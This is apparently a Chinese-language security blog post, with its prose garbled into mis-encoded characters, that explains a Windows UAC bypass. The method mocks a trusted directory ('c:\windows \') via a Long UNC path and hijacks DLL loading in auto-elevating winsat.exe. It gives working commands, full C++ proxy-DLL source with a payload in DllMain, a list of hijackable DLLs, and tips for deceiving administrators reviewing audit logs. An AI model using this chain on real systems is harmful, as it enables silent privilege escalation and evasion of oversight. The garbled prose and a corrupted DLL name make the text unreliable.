I"&<h2 id="0x00-å‰è¨€">0x00 å‰è¨€</h2>
<hr />

<p>ä»@CE2Wellsçš„åšå®¢å­¦åˆ°çš„ä¸€ä¸ªæŠ€å·§ï¼Œé€šè¿‡æ¨¡æ‹Ÿå¯ä¿¡ç›®å½•èƒ½å¤Ÿç»•è¿‡UACï¼Œæœ¬æ–‡å°†å¯¹ç»“åˆè‡ªå·±çš„ç»éªŒå¯¹è¿™ä¸ªæ–¹æ³•è¿›è¡Œä»‹ç»ï¼Œæ·»åŠ è‡ªå·±çš„ç†è§£ï¼Œåˆ†äº«æµ‹è¯•ä¸­çš„ç»†èŠ‚</p>

<p>æ–‡ç« åœ°å€ï¼š</p>

<p>https://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-24a96675f6e</p>

<h2 id="0x01-ç®€ä»‹">0x01 ç®€ä»‹</h2>
<hr />

<ul>
  <li>åŸç†ä»‹ç»</li>
  <li>å®ç°ç»†èŠ‚</li>
  <li>å®é™…æµ‹è¯•</li>
  <li>åˆ©ç”¨åˆ†æ</li>
</ul>

<h2 id="0x02-åŸç†ä»‹ç»">0x02 åŸç†ä»‹ç»</h2>
<hr />

<h3 id="1long-unc">1ã€Long UNC</h3>

<p>åœ¨ä¹‹å‰çš„æ–‡ç« <a href="https://3gstudent.github.io/Catalog%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0-Long-UNC%E6%96%87%E4%BB%B6%E5%90%8D%E6%AC%BA%E9%AA%97">ã€ŠCatalogç­¾åä¼ªé€ â€”â€”Long UNCæ–‡ä»¶åæ¬ºéª—ã€‹</a>æ›¾ä»‹ç»è¿‡exeæ–‡ä»¶ä½¿ç”¨Long UNCåèƒ½å¤Ÿæ¬ºéª—ç³»ç»Ÿï¼Œå°†å…¶è¯†åˆ«ä¸ºå¦ä¸€ä¸ªæ–‡ä»¶</p>

<p>ä¾‹å¦‚ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>type putty.exe &gt; "\\?\C:\Windows\System32\calc.exe "
</code></pre></div></div>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-8/2-0.png" alt="Alt text" /></p>

<p>è¿™ä¸ªæ–¹æ³•åŒæ ·é€‚ç”¨äºæ–‡ä»¶å¤¹</p>

<p>ä¾‹å¦‚ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>md "\\?\c:\windows "
</code></pre></div></div>

<p>æ–°åˆ›å»ºçš„æ–‡ä»¶å¤¹èƒ½å¤Ÿæ¬ºéª—ç³»ç»Ÿï¼Œå°†å…¶è¯†åˆ«ä¸ºå¦ä¸€ä¸ªæ–‡ä»¶å¤¹</p>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-8/2-1.png" alt="Alt text" /></p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-8/2-2.png" alt="Alt text" /></p>

<h3 id="2é»˜è®¤èƒ½å¤Ÿç»•è¿‡uacçš„æ–‡ä»¶">2ã€é»˜è®¤èƒ½å¤Ÿç»•è¿‡UACçš„æ–‡ä»¶</h3>

<p>éœ€è¦æ»¡è¶³ä»¥ä¸‹ä¸‰ä¸ªæ¡ä»¶ï¼š</p>

<ul>
  <li>ç¨‹åºé…ç½®ä¸ºè‡ªåŠ¨æå‡æƒé™ï¼Œä»¥ç®¡ç†å‘˜æƒé™æ‰§è¡Œ</li>
  <li>ç¨‹åºåŒ…å«ç­¾å</li>
  <li>ä»å—ä¿¡ä»»çš„ç›®å½•(<code class="language-plaintext highlighter-rouge">"c:\windows\system32"</code>)æ‰§è¡Œ</li>
</ul>

<h3 id="3æ™®é€šç”¨æˆ·æƒé™èƒ½å¤Ÿåœ¨ç£ç›˜æ ¹ç›®å½•åˆ›å»ºæ–‡ä»¶å¤¹">3ã€æ™®é€šç”¨æˆ·æƒé™èƒ½å¤Ÿåœ¨ç£ç›˜æ ¹ç›®å½•åˆ›å»ºæ–‡ä»¶å¤¹</h3>

<p>ä¾‹å¦‚ï¼Œæ™®é€šç”¨æˆ·æƒé™èƒ½å¤Ÿåœ¨cç›˜ä¸‹åˆ›å»ºæ–‡ä»¶å¤¹</p>

<h3 id="4dllåŠ«æŒ">4ã€dllåŠ«æŒ</h3>

<p>exeç¨‹åºå¦‚æœåœ¨å¯åŠ¨è¿‡ç¨‹ä¸­éœ€è¦åŠ è½½dllï¼Œé»˜è®¤å…ˆæœç´¢exeç¨‹åºçš„åŒçº§ç›®å½•</p>

<p>ç»¼ä¸Šï¼Œæ»¡è¶³äº†ç»•è¿‡UACçš„æ‰€æœ‰æ¡ä»¶</p>

<p>å®ç°çš„æ€è·¯å¦‚ä¸‹ï¼š</p>

<ol>
  <li>æ‰¾åˆ°ä¸€ä¸ªé»˜è®¤èƒ½å¤Ÿç»•è¿‡UACçš„æ–‡ä»¶ï¼Œä¾‹å¦‚<code class="language-plaintext highlighter-rouge">c:\windows\system32\winsat.exe</code></li>
  <li>ä½¿ç”¨Long UNCåˆ›å»ºä¸€ä¸ªç‰¹æ®Šçš„æ–‡ä»¶å¤¹<code class="language-plaintext highlighter-rouge">"c:\windows \"</code>ï¼Œå¹¶å°†winsat.exeå¤åˆ¶åˆ°è¯¥ç›®å½•</li>
  <li>æ‰§è¡Œwinsat.exeï¼Œè®°å½•å¯åŠ¨è¿‡ç¨‹ï¼Œå‘ç°å¯åŠ¨æ—¶éœ€è¦åŠ è½½åŒçº§ç›®å½•ä¸‹çš„WINMM.dll</li>
  <li>ç¼–å†™payload.dllï¼ŒæŒ‡å®šå¯¼å‡ºå‡½æ•°åŒ<code class="language-plaintext highlighter-rouge">c:\windows\system32\winmm.dll</code>ç›¸åŒï¼Œå¹¶å‘½åä¸º<code class="language-plaintext highlighter-rouge">"c:\windows \system32\WINMM.dll"</code></li>
  <li>æ‰§è¡Œ<code class="language-plaintext highlighter-rouge">"c:\windows \system32\winsat.exe"</code>ï¼Œå°†è‡ªåŠ¨ç»•è¿‡UACï¼ŒåŠ è½½<code class="language-plaintext highlighter-rouge">"c:\windows \system32\WINMM.dll"</code>ï¼Œæ‰§è¡Œpayload</li>
</ol>

<h2 id="0x03-å®ç°ç»†èŠ‚">0x03 å®ç°ç»†èŠ‚</h2>
<hr />

<h3 id="1å¯»æ‰¾å¯ä¾›åˆ©ç”¨çš„exe">1ã€å¯»æ‰¾å¯ä¾›åˆ©ç”¨çš„exe</h3>

<p>è¿™äº›æ–‡ä»¶çš„ç‰¹å¾ä¹‹ä¸€æ˜¯manifestä¸­çš„autoElevateå±æ€§ä¸ºtrue</p>

<p>å¯ä»¥å€ŸåŠ©powershellå®ç°è‡ªåŠ¨åŒ–æœç´¢ï¼Œå‚è€ƒå·¥å…·ï¼š</p>

<p>https://github.com/g3rzi/Manifesto</p>

<p>ç•Œé¢åŒ–çš„å·¥å…·ä½¿ç”¨å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-8/2-3.png" alt="Alt text" /></p>

<h3 id="2ä½¿ç”¨long-uncåˆ›å»ºä¸€ä¸ªç‰¹æ®Šçš„æ–‡ä»¶å¤¹cwindows-">2ã€ä½¿ç”¨Long UNCåˆ›å»ºä¸€ä¸ªç‰¹æ®Šçš„æ–‡ä»¶å¤¹<code class="language-plaintext highlighter-rouge">"c:\windows \"</code></h3>

<p>C++çš„å®ç°ä»£ç å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CreateDirectoryW(L"\\\\?\\C:\\Windows \\", 0);
</code></pre></div></div>

<p>é€šè¿‡å‘½ä»¤è¡Œå®ç°çš„å‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>md "\\?\c:\windows "
</code></pre></div></div>

<h3 id="3è®°å½•winsatexeçš„å¯åŠ¨è¿‡ç¨‹å¯»æ‰¾å¯åŠ¨æ—¶åŠ è½½çš„dll">3ã€è®°å½•winsat.exeçš„å¯åŠ¨è¿‡ç¨‹ï¼Œå¯»æ‰¾å¯åŠ¨æ—¶åŠ è½½çš„dll</h3>

<p>è¿™é‡Œå¯ä»¥ä½¿ç”¨Process Monitorï¼Œç­›é€‰å‡ºå¯åŠ¨è¿‡ç¨‹ä¸­ç»“æœä¸ºâ€NAME NOT FOUNDâ€çš„è®°å½•ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-8/2-4.png" alt="Alt text" /></p>

<p>å› æ­¤ï¼Œå¯ä¾›åˆ©ç”¨çš„dllåç§°å¦‚ä¸‹ï¼š</p>

<ul>
  <li>VERSION.dll</li>
  <li>WINMM.dll</li>
  <li>POWRPROF.dll</li>
  <li>dxgi.dll</li>
  <li>dwmapi.dll</li>
  <li>d3d10_1.dll</li>
  <li>d3d1-_1core.dll</li>
  <li>d3d11.dll</li>
  <li>d3d10core.dll</li>
  <li>QUARTZ.dll</li>
</ul>

<p>ä»»é€‰ä¸€ä¸ªå³å¯</p>

<h3 id="4ç¼–å†™payloaddllæŒ‡å®šå¯¼å‡ºå‡½æ•°">4ã€ç¼–å†™payload.dllï¼ŒæŒ‡å®šå¯¼å‡ºå‡½æ•°</h3>

<p>è¿™é‡Œå¯ä»¥ä½¿ç”¨exportstocï¼Œä¸‹è½½åœ°å€ï¼š</p>

<p>https://github.com/michaellandi/exportstoc</p>

<p>è¯¦ç»†ä½¿ç”¨è¯´æ˜å¯å‚è€ƒä¹‹å‰çš„æ–‡ç« <a href="https://3gstudent.github.io/Study-Notes-Weekly-No.1(Monitor-WMI_ExportsToC++_Use-DiskCleanup-bypass-UAC)">ã€ŠStudy Notes Weekly No.1(Monitor WMI &amp; ExportsToC++ &amp; Use DiskCleanup bypass UAC)ã€‹</a></p>

<p>ä¾‹å¦‚è¿™é‡Œé€‰æ‹©<code class="language-plaintext highlighter-rouge">VERSION.dll</code>ï¼ŒåŠ«æŒçš„åŸdllè·¯å¾„ä¸º<code class="language-plaintext highlighter-rouge">c:\\Windows\\system32\\version.dll</code>ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-8/2-5.png" alt="Alt text" /></p>

<p>æ·»åŠ payloadä¸ºå¯åŠ¨è®¡ç®—å™¨ï¼Œæœ€ç»ˆçš„ä»£ç å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include "stdafx.h"
#include &lt;iostream&gt;
#include &lt;windows.h&gt;

using namespace std;

#pragma comment (linker, "/export:GetFileVersionInfoA=c:\\windows\\system32\\version.GetFileVersionInfoA,@1")
#pragma comment (linker, "/export:GetFileVersionInfoByHandle=c:\\windows\\system32\\version.GetFileVersionInfoByHandle,@2")
#pragma comment (linker, "/export:GetFileVersionInfoExW=c:\\windows\\system32\\version.GetFileVersionInfoExW,@3")
#pragma comment (linker, "/export:GetFileVersionInfoSizeA=c:\\windows\\system32\\version.GetFileVersionInfoSizeA,@4")
#pragma comment (linker, "/export:GetFileVersionInfoSizeExW=c:\\windows\\system32\\version.GetFileVersionInfoSizeExW,@5")
#pragma comment (linker, "/export:GetFileVersionInfoSizeW=c:\\windows\\system32\\version.GetFileVersionInfoSizeW,@6")
#pragma comment (linker, "/export:GetFileVersionInfoW=c:\\windows\\system32\\version.GetFileVersionInfoW,@7")
#pragma comment (linker, "/export:VerFindFileA=c:\\windows\\system32\\version.VerFindFileA,@8")
#pragma comment (linker, "/export:VerFindFileW=c:\\windows\\system32\\version.VerFindFileW,@9")
#pragma comment (linker, "/export:VerInstallFileA=c:\\windows\\system32\\version.VerInstallFileA,@10")
#pragma comment (linker, "/export:VerInstallFileW=c:\\windows\\system32\\version.VerInstallFileW,@11")
#pragma comment (linker, "/export:VerLanguageNameA=c:\\windows\\system32\\version.VerLanguageNameA,@12")
#pragma comment (linker, "/export:VerLanguageNameW=c:\\windows\\system32\\version.VerLanguageNameW,@13")
#pragma comment (linker, "/export:VerQueryValueA=c:\\windows\\system32\\version.VerQueryValueA,@14")
#pragma comment (linker, "/export:VerQueryValueW=c:\\windows\\system32\\version.VerQueryValueW,@15")

BOOL WINAPI DllMain(HINSTANCE hInst,DWORD reason,LPVOID)
{
	system("start calc.exe");
	return true;
}
</code></pre></div></div>

<p>å°†å…¶ç¼–è¯‘æˆdllï¼Œå¦å­˜ä¸º<code class="language-plaintext highlighter-rouge">"c:\windows \system32\VERSION.dll"</code>ï¼Œ</p>

<h3 id="5å¯åŠ¨exe">5ã€å¯åŠ¨exe</h3>

<p>å‘½ä»¤è¡Œä¸‹å¯åŠ¨éœ€è¦ç»å¯¹è·¯å¾„ï¼š<code class="language-plaintext highlighter-rouge">"c:\windows \system32\winsat.exe"</code></p>

<p><strong>æ³¨ï¼š</strong></p>

<p>è¿™é‡Œä¸å¯ä»¥ä½¿ç”¨çŸ­æ–‡ä»¶å(çŸ­æ–‡ä»¶åé€šè¿‡<code class="language-plaintext highlighter-rouge">"dir /x"</code>è·å¾—ï¼‰</p>

<h2 id="0x04-åˆ©ç”¨åˆ†æ">0x04 åˆ©ç”¨åˆ†æ</h2>
<hr />

<p>1ã€å¯ä¾›åˆ©ç”¨çš„ä½ç½®ä¸å”¯ä¸€</p>

<p>åœ¨æˆ‘çš„æµ‹è¯•ç³»ç»Ÿ(Win7 x64)ä¸­,å¯ä¾›åˆ©ç”¨çš„exeæœ‰39ä¸ªï¼Œå¯ä¾›åˆ©ç”¨çš„dllä¹Ÿæœ‰å¾ˆå¤š</p>

<p>2ã€å¯¹äºLong UNCè¿™ç§æ–‡ä»¶å¤¹è¿˜æœ‰å…¶ä»–å½¢å¼</p>

<p>ä¾‹å¦‚ï¼š</p>

<ul>
  <li>æ–‡ä»¶åå¯ä»¥åŒ…å«å¤šä¸ªç©ºæ ¼ï¼š <code class="language-plaintext highlighter-rouge">"\\?\C:\Windows    "</code></li>
  <li>ä½¿ç”¨å­—ç¬¦<code class="language-plaintext highlighter-rouge">"."</code>(æœ€å°‘ä¸¤ä¸ª)ï¼š <code class="language-plaintext highlighter-rouge">"\\?\C:\Windows.."</code></li>
</ul>

<p>ä½†å…¶ä»–å½¢å¼çš„æ–‡ä»¶å¤¹æ— æ³•ç”¨æ¥ç»•è¿‡UAC</p>

<p>3ã€ä½¿ç”¨Long UNCåˆ›å»ºä¼ªé€ çš„æ–‡ä»¶å¤¹èƒ½å¤Ÿæ¬ºéª—â€œç²—å¿ƒçš„ç®¡ç†å‘˜â€</p>

<p>ä¾‹å¦‚ç³»ç»Ÿå¼€å¯<code class="language-plaintext highlighter-rouge">Windows command line process auditing</code>ï¼Œè®°å½•ç¨‹åºè¿è¡Œçš„å‚æ•°</p>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-8/3-1.png" alt="Alt text" /></p>

<p>è‚‰çœ¼å¾ˆéš¾åˆ†è¾¨</p>

<h2 id="0x05-å°ç»“">0x05 å°ç»“</h2>
<hr />

<p>æœ¬æ–‡å¯¹é€šè¿‡æ¨¡æ‹Ÿå¯ä¿¡ç›®å½•ç»•è¿‡UACçš„æ–¹æ³•è¿›è¡Œåˆ†æï¼Œåˆ†äº«æµ‹è¯•ä¸­çš„ç»†èŠ‚</p>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

:ET